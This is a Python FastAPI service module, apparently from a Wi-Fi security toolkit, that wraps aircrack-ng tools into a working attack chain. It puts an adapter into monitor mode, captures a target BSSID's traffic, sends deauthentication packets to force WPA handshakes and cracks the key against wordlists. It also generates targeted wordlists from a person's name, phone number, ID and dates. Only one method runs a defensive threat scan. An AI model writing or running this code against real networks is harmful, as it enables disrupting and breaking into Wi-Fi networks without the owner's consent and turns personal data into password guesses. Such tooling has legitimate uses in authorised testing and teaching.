import os
import subprocess
import asyncio
import glob
import re
from datetime import datetime
from typing import Any, Dict, List, Optional

from fastapi import BackgroundTasks

from services.wifi_service import WiFiService
from api.mylib.WeakPasswordGenerater.main import PasswordGenerator
from api.mylib.ap_scan import scan_wifi_networks
from api.mylib.defense.defense_manager import DefenseManager

# Module-level global state (preserved across requests)
_capture_active = False
_capture_process = None
_network_adapters: List[str] = []


def extract_adapter_names(ifconfig_output: str) -> List[str]:
    adapter_names = []
    lines = ifconfig_output.split('\n')
    for line in lines:
        if line and not line.startswith(' ') and not line.startswith('\t'):
            if ':' in line:
                adapter_name = line.split(':')[0].strip()
            else:
                parts = line.split()
                if parts:
                    adapter_name = parts[0].strip()
                else:
                    continue
            if (adapter_name and adapter_name.isalnum()) or any(c in adapter_name for c in ['-', '_']):
                adapter_names.append(adapter_name)
    return adapter_names


def parse_aircrack_output(output: str) -> List[Dict]:
    networks = []
    try:
        lines = output.split('\n')
        in_network_list = False
        for line in lines:
            line = line.strip()
            if "#  BSSID" in line and "ESSID" in line and "Encryption" in line:
                in_network_list = True
                continue
            if in_network_list and not line:
                break
            if in_network_list and line and line[0].isdigit():
                parts = line.split()
                if len(parts) >= 4:
                    try:
                        network_num = parts[0]
                        bssid = parts[1]
                        encryption_start = -1
                        for i, part in enumerate(parts[2:], 2):
                            if any(enc in part.upper() for enc in ['WPA', 'WEP', 'OPN']):
                                encryption_start = i
                                break
                        if encryption_start > 2:
                            essid = ' '.join(parts[2:encryption_start])
                            encryption_info = ' '.join(parts[encryption_start:])
                        else:
                            essid = parts[2] if len(parts) > 2 else "Unknown"
                            encryption_info = ' '.join(parts[3:]) if len(parts) > 3 else "Unknown"
                        handshakes = 0
                        if "handshake" in encryption_info.lower():
                            handshake_match = re.search(r'\((\d+) handshake', encryption_info)
                            if handshake_match:
                                handshakes = int(handshake_match.group(1))
                        networks.append({
                            "number": int(network_num),
                            "bssid": bssid,
                            "essid": essid,
                            "encryption": encryption_info,
                            "handshakes": handshakes
                        })
                    except (ValueError, IndexError) as e:
                        print(f"Error parsing network line '{line}': {e}")
                        continue
    except Exception as e:
        print(f"Error parsing aircrack output: {e}")
    return networks


async def run_capture_process(command, output_path):
    global _capture_process, _capture_active
    try:
        _capture_active = True
        _capture_process = await asyncio.create_subprocess_exec(
            *command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await _capture_process.wait()
    except Exception as e:
        print(f"Capture process error: {e}")
    finally:
        _capture_active = False
        _capture_process = None


class WiFiRealService(WiFiService):

    async def get_interface_details(self) -> Dict[str, Any]:
        global _network_adapters
        try:
            result = subprocess.run(
                ["ifconfig", "-a"],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                _network_adapters = extract_adapter_names(result.stdout)
                return {
                    "success": True,
                    "output": result.stdout,
                    "message": "Network adapters listed successfully",
                    "adapters": _network_adapters
                }
            else:
                return {
                    "success": False,
                    "message": f"Failed to execute ifconfig: {result.stderr}",
                    "output": result.stderr,
                    "adapters": []
                }
        except subprocess.TimeoutExpired:
            return {"success": False, "message": "Command timed out", "output": "", "adapters": []}
        except FileNotFoundError:
            return {
                "success": False,
                "message": "ifconfig command not found. Please ensure net-tools is installed.",
                "output": "",
                "adapters": []
            }
        except Exception as e:
            return {"success": False, "message": f"Error executing ifconfig: {str(e)}", "output": "", "adapters": []}

    async def get_interface_list(self) -> Dict[str, Any]:
        global _network_adapters
        return {
            "success": True,
            "adapters": _network_adapters,
            "count": len(_network_adapters)
        }

    async def set_monitor_mode(self, interface: str) -> Dict[str, Any]:
        try:
            up_result = subprocess.run(
                ["sudo", "ifconfig", interface, "up"],
                capture_output=True, text=True, timeout=10
            )
            if up_result.returncode != 0:
                return {
                    "success": False,
                    "message": f"Failed to bring up interface {interface}",
                    "error": up_result.stderr
                }
            monitor_result = subprocess.run(
                ["sudo", "iwconfig", interface, "mode", "monitor"],
                capture_output=True, text=True, timeout=10
            )
            if monitor_result.returncode != 0:
                return {
                    "success": False,
                    "message": f"Failed to set monitor mode for {interface}",
                    "error": monitor_result.stderr
                }
            return {
                "success": True,
                "message": f"Monitor mode activated successfully for {interface}",
                "interface": interface
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "message": "Command timed out", "interface": interface}
        except Exception as e:
            return {"success": False, "message": f"Error activating monitor mode: {str(e)}", "interface": interface}

    async def get_interface_status(self, interface: str) -> Dict[str, Any]:
        try:
            result = subprocess.run(
                ["iwconfig", interface],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode != 0:
                return {
                    "success": False,
                    "message": f"Failed to get status for interface {interface}",
                    "error": result.stderr,
                    "interface": interface
                }
            output = result.stdout
            mode = "Unknown"
            if "Mode:Monitor" in output:
                mode = "Monitor"
            elif "Mode:Managed" in output:
                mode = "Managed"
            elif "Mode:Master" in output:
                mode = "Master"
            elif "Mode:Ad-Hoc" in output:
                mode = "Ad-Hoc"
            elif "no wireless extensions" in output.lower():
                return {
                    "success": False,
                    "message": f"Interface {interface} is not a wireless interface",
                    "interface": interface
                }
            return {
                "success": True,
                "interface": interface,
                "mode": mode,
                "status": f"{mode} mode",
                "output": output
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "message": "Command timed out", "interface": interface}
        except Exception as e:
            return {"success": False, "message": f"Error getting interface status: {str(e)}", "interface": interface}

    async def scan_networks(self, interface: str, timeout: int) -> Dict[str, Any]:
        try:
            loop = asyncio.get_event_loop()
            nearby_ap = await loop.run_in_executor(None, scan_wifi_networks, interface, timeout)
            return {
                "success": True,
                "ap_list": nearby_ap,
                "interface": interface,
                "count": len(nearby_ap)
            }
        except Exception as e:
            return {
                "success": False,
                "message": f"Failed to scan networks: {str(e)}",
                "ap_list": [],
                "interface": interface,
                "count": 0
            }

    async def set_channel(self, interface: str, channel: str) -> Dict[str, Any]:
        try:
            result = subprocess.run(
                ["sudo", "iwconfig", interface, "channel", channel],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode != 0:
                return {
                    "success": False,
                    "message": f"Failed to set channel {channel} for {interface}",
                    "error": result.stderr
                }
            return {
                "success": True,
                "message": f"Channel {channel} set successfully for {interface}",
                "interface": interface,
                "channel": channel
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "message": "Command timed out", "interface": interface, "channel": channel}
        except Exception as e:
            return {"success": False, "message": f"Error setting channel: {str(e)}", "interface": interface, "channel": channel}

    async def start_capture(self, request: Any, background_tasks: BackgroundTasks) -> Dict[str, Any]:
        global _capture_active, _capture_process
        if _capture_active:
            return {"success": False, "message": "Capture is already running"}
        try:
            output_file = "deauth_handshake"
            os.makedirs("data/captures", exist_ok=True)
            output_path = os.path.join("data/captures", output_file)
            old_file_patterns = [
                f"{output_path}*.cap",
                f"{output_path}*.csv",
                f"{output_path}*.kismet*",
                f"{output_path}*.log.csv"
            ]
            for pattern in old_file_patterns:
                for old_file in glob.glob(pattern):
                    try:
                        if os.path.exists(old_file):
                            os.remove(old_file)
                    except Exception as e:
                        print(f"Failed to remove old file {old_file}: {e}")
            capture_command = [
                "sudo", "airodump-ng",
                "-c", str(request.channel),
                "--bssid", request.bssid,
                "-w", output_path,
                request.interface
            ]
            background_tasks.add_task(run_capture_process, capture_command, output_path)
            return {
                "success": True,
                "message": "Traffic capture started",
                "capture_file": "deauth_handshake-01.cap",
                "command": " ".join(capture_command)
            }
        except Exception as e:
            return {"success": False, "message": f"Failed to start capture: {str(e)}"}

    async def stop_capture(self) -> Dict[str, Any]:
        global _capture_active, _capture_process
        try:
            if not _capture_active or not _capture_process:
                return {"success": False, "message": "No capture is currently running"}
            _capture_process.terminate()
            try:
                await asyncio.wait_for(_capture_process.wait(), timeout=5.0)
            except asyncio.TimeoutError:
                _capture_process.kill()
                await _capture_process.wait()
            _capture_active = False
            _capture_process = None
            return {"success": True, "message": "Traffic capture stopped"}
        except Exception as e:
            return {"success": False, "message": f"Failed to stop capture: {str(e)}"}

    async def send_deauth(self, interface: str, bssid: str, packets: int) -> Dict[str, Any]:
        try:
            deauth_command = [
                "sudo", "aireplay-ng",
                "--deauth", str(packets),
                "-a", bssid,
                interface
            ]
            result = subprocess.run(deauth_command, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                return {
                    "success": True,
                    "message": f"Successfully sent {packets} deauth packets to {bssid}",
                    "packets_sent": packets,
                    "target_bssid": bssid,
                    "interface": interface,
                    "command": " ".join(deauth_command),
                    "output": result.stdout
                }
            else:
                return {
                    "success": False,
                    "message": f"Failed to send deauth packets: {result.stderr}",
                    "command": " ".join(deauth_command),
                    "error": result.stderr
                }
        except subprocess.TimeoutExpired:
            return {"success": False, "message": "Deauth command timed out (30 seconds)", "packets_sent": 0}
        except Exception as e:
            return {"success": False, "message": f"Error sending deauth packets: {str(e)}", "packets_sent": 0}

    async def check_handshake(self, capture_file: str) -> Dict[str, Any]:
        try:
            capture_path = os.path.join("data/captures", capture_file)
            if not os.path.exists(capture_path):
                capture_dir = "data/captures"
                if os.path.exists(capture_dir):
                    cap_files = glob.glob(os.path.join(capture_dir, "deauth_handshake*.cap"))
                    if cap_files:
                        capture_path = max(cap_files, key=os.path.getmtime)
                        capture_file = os.path.basename(capture_path)
                    else:
                        return {
                            "success": False,
                            "message": f"No deauth_handshake files found in {capture_dir}",
                            "handshakes": 0,
                            "networks": []
                        }
                else:
                    return {
                        "success": False,
                        "message": f"Capture directory not found: {capture_dir}",
                        "handshakes": 0,
                        "networks": []
                    }
            if not os.path.exists(capture_path):
                return {
                    "success": False,
                    "message": f"Capture file not found: {capture_file}",
                    "handshakes": 0,
                    "networks": []
                }
            aircrack_command = ["sudo", "aircrack-ng", capture_path]
            result = subprocess.run(aircrack_command, capture_output=True, text=True, timeout=30)
            networks = parse_aircrack_output(result.stdout)
            total_handshakes = sum(n.get('handshakes', 0) for n in networks)
            return {
                "success": True,
                "message": f"Found {total_handshakes} handshake(s) in {len(networks)} network(s)",
                "capture_file": capture_file,
                "total_handshakes": total_handshakes,
                "total_networks": len(networks),
                "networks": networks,
                "command": " ".join(aircrack_command),
                "raw_output": result.stdout
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "message": "Aircrack-ng command timed out (30 seconds)", "handshakes": 0, "networks": []}
        except Exception as e:
            return {"success": False, "message": f"Error checking handshakes: {str(e)}", "handshakes": 0, "networks": []}

    async def crack_password(self, capture_file: str, wordlist_file: str) -> Dict[str, Any]:
        try:
            capture_path = os.path.join("data/captures", capture_file)
            if not os.path.exists(capture_path):
                capture_dir = "data/captures"
                if os.path.exists(capture_dir):
                    cap_files = glob.glob(os.path.join(capture_dir, "deauth_handshake*.cap"))
                    if cap_files:
                        capture_path = max(cap_files, key=os.path.getmtime)
                        capture_file = os.path.basename(capture_path)
                    else:
                        return {"success": False, "message": f"No capture files found in {capture_dir}"}
                else:
                    return {"success": False, "message": f"Capture directory not found: {capture_dir}"}
            wordlist_path = os.path.join("static", wordlist_file)
            if not os.path.exists(wordlist_path):
                return {"success": False, "message": f"Wordlist file not found: {wordlist_file}"}
            crack_command = ["sudo", "aircrack-ng", capture_path, "-w", wordlist_path]
            result = subprocess.run(crack_command, capture_output=True, text=True, timeout=300)
            password_found = None
            if "KEY FOUND!" in result.stdout:
                for line in result.stdout.split('\n'):
                    if "KEY FOUND!" in line:
                        password_match = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', line)
                        if password_match:
                            password_found = password_match.group(1)
                        break
            return {
                "success": True,
                "message": "Password cracking completed",
                "capture_file": capture_file,
                "wordlist_file": wordlist_file,
                "password_found": password_found,
                "command": " ".join(crack_command),
                "raw_output": result.stdout,
                "return_code": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "message": "Password cracking timed out (5 minutes)."}
        except Exception as e:
            return {"success": False, "message": f"Error during password cracking: {str(e)}"}

    async def generate_wordlist(self, output_filename: str, info_data: Dict[str, List[str]]) -> Dict[str, Any]:
        try:
            filename = output_filename
            if not filename.endswith('.txt'):
                filename += '.txt'
            generator = PasswordGenerator(output_file=f"static/wordlists/{filename}")
            generator.generate(
                DATE=info_data.get('date', []),
                TEL=info_data.get('tel', []),
                NAME=info_data.get('name', []),
                ID=info_data.get('ID', []),
                SSID=info_data.get('SSID', [''])[0] if info_data.get('SSID') else ''
            )
            file_path = f"static/wordlists/{filename}"
            with open(file_path, 'r') as f:
                lines = f.readlines()
                total_count = len(lines)
                sample = ''.join(lines[:10])
            return {
                "success": True,
                "filename": filename,
                "count": total_count,
                "sample": sample,
                "download_link": f"/static/wordlists/{filename}"
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def list_wordlists(self) -> Dict[str, Any]:
        try:
            wordlists = []
            wordlists_dir = "static/wordlists"
            if os.path.exists(wordlists_dir):
                for file in os.listdir(wordlists_dir):
                    if file.endswith('.txt'):
                        file_path = os.path.join(wordlists_dir, file)
                        if os.path.isfile(file_path):
                            file_stat = os.stat(file_path)
                            wordlists.append({
                                "filename": file,
                                "path": f"wordlists/{file}",
                                "size": file_stat.st_size,
                                "category": "custom",
                                "modified": datetime.fromtimestamp(file_stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                                "download_link": f"/static/wordlists/{file}"
                            })
            standard_dir = "static/wordlists/standard"
            if os.path.exists(standard_dir):
                for file in os.listdir(standard_dir):
                    if file.endswith('.txt'):
                        file_path = os.path.join(standard_dir, file)
                        if os.path.isfile(file_path):
                            file_stat = os.stat(file_path)
                            wordlists.append({
                                "filename": file,
                                "path": f"wordlists/standard/{file}",
                                "size": file_stat.st_size,
                                "category": "standard",
                                "modified": datetime.fromtimestamp(file_stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                                "download_link": f"/static/wordlists/standard/{file}"
                            })
            wordlists.sort(key=lambda x: (x['category'], x['filename']))
            return {"success": True, "wordlists": wordlists, "count": len(wordlists)}
        except Exception as e:
            return {"success": False, "message": f"Error listing wordlists: {str(e)}", "wordlists": [], "count": 0}

    async def delete_wordlist(self, filename: str) -> Dict[str, Any]:
        try:
            if not re.match(r'^[a-zA-Z0-9_.-]+\.txt$', filename):
                return {"success": False, "message": "Invalid filename format"}
            file_path = os.path.join("static/wordlists", filename)
            if "standard" in filename or os.path.exists(os.path.join("static/wordlists/standard", filename)):
                return {"success": False, "message": "Cannot delete standard wordlist files"}
            if not os.path.exists(file_path):
                return {"success": False, "message": f"File not found: {filename}"}
            if not os.path.isfile(file_path):
                return {"success": False, "message": f"Not a file: {filename}"}
            os.remove(file_path)
            return {"success": True, "message": f"Successfully deleted {filename}"}
        except Exception as e:
            return {"success": False, "message": f"Error deleting wordlist: {str(e)}"}

    async def defense_scan(self, interface: str, timeout: int) -> Dict[str, Any]:
        try:
            defense_manager = DefenseManager(iface=interface)
            result = defense_manager.run_wifi_defense()
            return {
                "success": True,
                "module": result["module"],
                "issues": result["issues"],
                "threat": result["threat"],
                "interface": interface
            }
        except Exception as e:
            return {
                "success": False,
                "message": f"Failed to scan and analyze Wi-Fi threats: {str(e)}",
                "issues": [],
                "threat": {"score": 0, "status": "UNKNOWN"}
            }
